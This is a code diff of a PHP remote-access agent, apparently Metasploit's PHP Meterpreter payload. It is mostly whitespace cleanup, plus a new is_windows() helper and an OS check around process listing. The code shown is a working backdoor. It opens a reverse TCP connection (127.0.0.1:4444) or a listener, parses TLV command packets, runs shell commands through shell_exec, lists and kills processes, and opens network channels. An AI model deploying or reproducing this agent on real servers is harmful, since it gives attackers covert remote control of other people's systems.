@@ -1,8 +1,8 @@
 #<?php # This lets us run as a standalone file or as eval'd code
 function my_print($str) {
-	error_log($str);
-	#print($str ."\n");
-	#flush();
+    error_log($str);
+    #print($str ."\n");
+    #flush();
 }
 if (!function_exists("file_get_contents")) {
     function file_get_contents($file) {
@@ -15,66 +15,65 @@ if (!function_exists("file_get_contents")) {
          return $contents;
     }
 }
-function hexdump($data, $htmloutput = false, $uppercase = false, $return = false)  
-{  
-    # Init  
-    $hexi   = '';  
-    $ascii  = '';  
-    $dump   = ($htmloutput === true) ? '<pre>' : '';  
-    $offset = 0;  
-    $len    = strlen($data);  
-   
-    # Upper or lower case hexidecimal  
-    $x = ($uppercase === false) ? 'x' : 'X';  
-   
-    # Iterate string  
-    for ($i = $j = 0; $i < $len; $i++)  {  
-        # Convert to hexidecimal  
-        $hexi .= sprintf("%02$x ", ord($data[$i]));  
-   
-        # Replace non-viewable bytes with '.'  
-        if (ord($data[$i]) >= 32) {  
-            $ascii .= ($htmloutput === true) ?  
-                            htmlentities($data[$i]) :  
-                            $data[$i];  
-        } else {  
-            $ascii .= '.';  
-        }  
-   
-        # Add extra column spacing  
-        if ($j === 7) {  
-            $hexi  .= ' ';  
-            $ascii .= ' ';  
-        }  
-   
-        # Add row  
-        if (++$j === 16 || $i === $len - 1) {  
-            # Join the hexi / ascii output  
-            $dump .= sprintf("%04$x  %-49s  %s", $offset, $hexi, $ascii);  
-              
-            # Reset vars  
-            $hexi   = $ascii = '';  
-            $offset += 16;  
-            $j      = 0;  
-              
-            # Add newline              
-            if ($i !== $len - 1) {  
-                $dump .= "\n";  
-            }  
-        }  
-    }  
-   
-    # Finish dump  
-    $dump .= $htmloutput === true ? '</pre>' : '';  
-    $dump .= "\n";  
-   
-    # Output method  
-    if ($return === false)   {  
-        echo $dump;  
-    } else {  
-        return $dump;  
-    }  
-}  
+function hexdump($data, $htmloutput = false, $uppercase = false, $return = false)
+{
+    # Init
+    $hexi   = '';
+    $ascii  = '';
+    $dump   = ($htmloutput === true) ? '<pre>' : '';
+    $offset = 0;
+    $len    = strlen($data);
+
+    # Upper or lower case hexidecimal
+    $x = ($uppercase === false) ? 'x' : 'X';
+
+    # Iterate string
+    for ($i = $j = 0; $i < $len; $i++)  {
+        # Convert to hexidecimal
+        $hexi .= sprintf("%02$x ", ord($data[$i]));
+
+        # Replace non-viewable bytes with '.'
+        if (ord($data[$i]) >= 32) {
+            $ascii .= ($htmloutput === true) ?
+                            htmlentities($data[$i]) :
+                            $data[$i];
+        } else {
+            $ascii .= '.';
+        }
+        # Add extra column spacing
+        if ($j === 7) {
+            $hexi  .= ' ';
+            $ascii .= ' ';
+        }
+
+        # Add row
+        if (++$j === 16 || $i === $len - 1) {
+            # Join the hexi / ascii output
+            $dump .= sprintf("%04$x  %-49s  %s", $offset, $hexi, $ascii);
+
+            # Reset vars
+            $hexi   = $ascii = '';
+            $offset += 16;
+            $j      = 0;
+
+            # Add newline
+            if ($i !== $len - 1) {
+                $dump .= "\n";
+            }
+        }
+    }
+
+    # Finish dump
+    $dump .= $htmloutput === true ? '</pre>' : '';
+    $dump .= "\n";
+
+    # Output method
+    if ($return === false) {
+        echo $dump;
+    } else {
+        return $dump;
+    }
+}
 
 
 #
@@ -124,11 +123,11 @@ define("TLV_TYPE_METHOD",              TLV_META_TYPE_STRING |   1);
 define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
 define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
 define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);
-                                      
+
 define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
 define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
 define("TLV_TYPE_BOOL",                TLV_META_TYPE_BOOL   |  12);
-                                      
+
 define("TLV_TYPE_LENGTH",              TLV_META_TYPE_UINT   |  25);
 define("TLV_TYPE_DATA",                TLV_META_TYPE_RAW    |  26);
 define("TLV_TYPE_FLAGS",               TLV_META_TYPE_UINT   |  27);
@@ -241,7 +240,7 @@ define("TLV_TYPE_PROCESS_PATH",        TLV_META_TYPE_STRING  | 2302);
 define("TLV_TYPE_PROCESS_GROUP",       TLV_META_TYPE_GROUP   | 2303);
 define("TLV_TYPE_PROCESS_FLAGS",       TLV_META_TYPE_UINT    | 2304);
 define("TLV_TYPE_PROCESS_ARGUMENTS",   TLV_META_TYPE_STRING  | 2305);
-                                       
+
 define("TLV_TYPE_IMAGE_FILE",          TLV_META_TYPE_STRING  | 2400);
 define("TLV_TYPE_IMAGE_FILE_PATH",     TLV_META_TYPE_STRING  | 2401);
 define("TLV_TYPE_PROCEDURE_NAME",      TLV_META_TYPE_STRING  | 2402);
@@ -249,14 +248,14 @@ define("TLV_TYPE_PROCEDURE_ADDRESS",   TLV_META_TYPE_UINT    | 2403);
 define("TLV_TYPE_IMAGE_BASE",          TLV_META_TYPE_UINT    | 2404);
 define("TLV_TYPE_IMAGE_GROUP",         TLV_META_TYPE_GROUP   | 2405);
 define("TLV_TYPE_IMAGE_NAME",          TLV_META_TYPE_STRING  | 2406);
-                                       
+
 define("TLV_TYPE_THREAD_ID",           TLV_META_TYPE_UINT    | 2500);
 define("TLV_TYPE_THREAD_PERMS",        TLV_META_TYPE_UINT    | 2502);
 define("TLV_TYPE_EXIT_CODE",           TLV_META_TYPE_UINT    | 2510);
 define("TLV_TYPE_ENTRY_POINT",         TLV_META_TYPE_UINT    | 2511);
 define("TLV_TYPE_ENTRY_PARAMETER",     TLV_META_TYPE_UINT    | 2512);
 define("TLV_TYPE_CREATION_FLAGS",      TLV_META_TYPE_UINT    | 2513);
-                                       
+
 define("TLV_TYPE_REGISTER_NAME",       TLV_META_TYPE_STRING  | 2540);
 define("TLV_TYPE_REGISTER_SIZE",       TLV_META_TYPE_UINT    | 2541);
 define("TLV_TYPE_REGISTER_VALUE_32",   TLV_META_TYPE_UINT    | 2542);
@@ -298,6 +297,9 @@ function my_cmd($cmd) {
     return shell_exec($cmd);
 }
 
+function is_windows() {
+    return (strtoupper(substr(PHP_OS,0,3)) == "WIN");
+}
 
 
 ##
@@ -305,7 +307,7 @@ function my_cmd($cmd) {
 ##
 
 # Wrap everything in checks for existence of the new functions in case we get
-# eval'd twice	
+# eval'd twice
 my_print("Evaling stdapi");
 # works
 if (!function_exists('stdapi_fs_chdir')) {
@@ -500,27 +502,31 @@ function stdapi_sys_process_execute($req, &$pkt) {
 
 # Works, but not very portable.  There doesn't appear to be a PHP way of
 # getting a list of processes, so we just shell out to ps.  I need to decide
-# what options to send to ps for portability and for information usefulness; 
+# what options to send to ps for portability and for information usefulness;
 # also, figure out a windows option -- tasklist.exe might work, but it doesn't
 # exist on older versions.
 if (!function_exists('stdapi_sys_process_get_processes')) {
 function stdapi_sys_process_get_processes($req, &$pkt) {
     my_print("doing get_processes");
     $list = array();
-	# This command produces a line like:
-	#    1553 root     /sbin/getty -8 38400 tty1
-    $output = my_cmd("ps a -w -o pid,user,cmd --no-header 2>/dev/null");
-    $lines = explode("\n", trim($output));
-    foreach ($lines as $line) {
-        array_push($list, preg_split("/\s+/", trim($line)));
+    if (is_windows()) {
+        # meh
+    } else {
+        # This command produces a line like:
+        #    1553 root     /sbin/getty -8 38400 tty1
+        $output = my_cmd("ps a -w -o pid,user,cmd --no-header 2>/dev/null");
+        $lines = explode("\n", trim($output));
+        foreach ($lines as $line) {
+            array_push($list, preg_split("/\s+/", trim($line)));
+        }
     }
     foreach ($list as $proc) {
         $grp = "";
         $grp .= tlv_pack(create_tlv(TLV_TYPE_PID, $proc[0]));
         $grp .= tlv_pack(create_tlv(TLV_TYPE_USER_NAME, $proc[1]));
         $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_NAME, $proc[2]));
-		# Strip the pid and the user name off the front; the rest will be the
-		# full command line
+        # Strip the pid and the user name off the front; the rest will be the
+        # full command line
         array_shift($proc);
         array_shift($proc);
         $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
@@ -541,9 +547,9 @@ function stdapi_sys_process_getpid($req, &$pkt) {
 
 if (!function_exists('stdapi_sys_process_kill')) {
 function stdapi_sys_process_kill($req, &$pkt) {
-	# The existence of posix_kill is unlikely (it's a php compile-time option
-	# that isn't enabled by default, but better to try it and avoid shelling
-	# out when unnecessary.
+    # The existence of posix_kill is unlikely (it's a php compile-time option
+    # that isn't enabled by default, but better to try it and avoid shelling
+    # out when unnecessary.
     my_print("doing kill");
     $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
     $pid = $pid_tlv['value'];
@@ -625,7 +631,7 @@ function channel_create_stdapi_net_tcp_client($req, &$pkt) {
     $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
 
     $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-	$res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
+    $res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
 
     if (is_resource($sock)) {
         array_push($channels, array(0 => $sock, 1 => $sock, 'type' => 'socket'));
@@ -661,7 +667,7 @@ function core_channel_open($req, &$pkt) {
         #$ret = channel_create_generic($req, $pkt);
         $ret = ERROR_FAILURE;
     }
-    
+
     return $ret;
 }
 function core_channel_eof($req, &$pkt) {
@@ -818,7 +824,7 @@ function channel_interact($chan_id) {
 # TLV Helper Functions
 ##
 
-function create_response($req) { 
+function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
 
     $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
@@ -850,12 +856,12 @@ function tlv_pack($tlv) {
     #my_print("Creating a tlv of type: {$tlv['type']}");
     if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
         $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
-    } 
+    }
     elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
         $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
     }
     elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
-        # PHP's pack appears to be busted for chars, 
+        # PHP's pack appears to be busted for chars,
         $ret = pack("NN", 8 + 1, $tlv['type']);
         $ret .= $tlv['value'] ? "\x01" : "\x00";
     }
@@ -865,18 +871,18 @@ function tlv_pack($tlv) {
     elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
         # treat groups the same as raw
         $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
-    } 
+    }
     elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
         # treat complex the same as raw
         $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
-    } 
+    }
     else {
         my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf");
     }
     return $ret;
 }
 
-function packet_add_tlv(&$pkt, $tlv) { 
+function packet_add_tlv(&$pkt, $tlv) {
     $pkt .= tlv_pack($tlv);
 }
 
@@ -891,10 +897,10 @@ function packet_get_tlv($pkt, $type) {
             #my_print("Found one at offset $offset");
             if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
                 $tlv = unpack("Nlen/Ntype/a*value", substr($pkt, $offset, $tlv['len']));
-            } 
+            }
             elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
                 $tlv = unpack("Nlen/Ntype/Nvalue", substr($pkt, $offset, $tlv['len']));
-            } 
+            }
             elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
                 $tlv = unpack("Nlen/Ntype/cvalue", substr($pkt, $offset, $tlv['len']));
             }
@@ -932,31 +938,31 @@ $port = 4444;
 
 $listen = false;
 if ($listen) {
-	my_print("Listening on $port");
+    my_print("Listening on $port");
 
-	$setsockopt = 'socket_setopt';
-	if (!is_callable($setsockopt )) {
-		# renamed in PHP 4.3.0
-		$setsockopt = 'socket_set_option';
-	}
+    $setsockopt = 'socket_setopt';
+    if (!is_callable($setsockopt )) {
+        # renamed in PHP 4.3.0
+        $setsockopt = 'socket_set_option';
+    }
 
-	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-	# don't care if this fails
-	@$setsockopt($sock, SOL_SOCKET, SO_REUSEADDR, 1);
-	$ret = socket_bind($sock, 0, $port);
-	$ret = socket_listen($sock, 5);
-	$msgsock = socket_accept($sock);
-	socket_close($sock);
+    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+    # don't care if this fails
+    @$setsockopt($sock, SOL_SOCKET, SO_REUSEADDR, 1);
+    $ret = socket_bind($sock, 0, $port);
+    $ret = socket_listen($sock, 5);
+    $msgsock = socket_accept($sock);
+    socket_close($sock);
 
-	my_print("Got a socket connection $sock");
+    my_print("Got a socket connection $sock");
 } else {
-	my_print("Connecting to $port");
-	$ipaddr = '127.0.0.1';
-	$msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-	$res = socket_connect($msgsock,$ipaddr,$port);
-	if (!$res) {
-		die();
-	}
+    my_print("Connecting to $port");
+    $ipaddr = '127.0.0.1';
+    $msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+    $res = socket_connect($msgsock,$ipaddr,$port);
+    if (!$res) {
+        die();
+    }
 }
 
 $socket_readers = array($msgsock);
@@ -970,10 +976,10 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
     foreach ($r as $ready) {
         if ($ready == $msgsock) {
             $request = socket_read($msgsock, 8, PHP_BINARY_READ);
-            if (FALSE==$request) { 
+            if (FALSE==$request) {
                 # We failed on the main socket.  There's no way to continue, so
                 # break all the way out.
-                break 2; 
+                break 2;
             }
             $a = unpack("Nlen/Ntype", $request);
             # length of the whole packet, including header
@@ -984,7 +990,7 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
                 $request .= socket_read($msgsock, $len-strlen($request), PHP_BINARY_READ);
             }
             hexdump(substr($request, 0, $len));
-			my_print("creating response");
+            my_print("creating response");
             $response = create_response($request);
 
             socket_write($msgsock, $response);
@@ -999,7 +1005,7 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
     #if (0 < count($file_readers)) {
     #    stream_select($r=$file_readers, $w=NULL, $e=NULL, 0);
     #    foreach ($r as $ready) {
-    #        $read = fread($r, 
+    #        $read = fread($r,
     #    }
     #}
 }
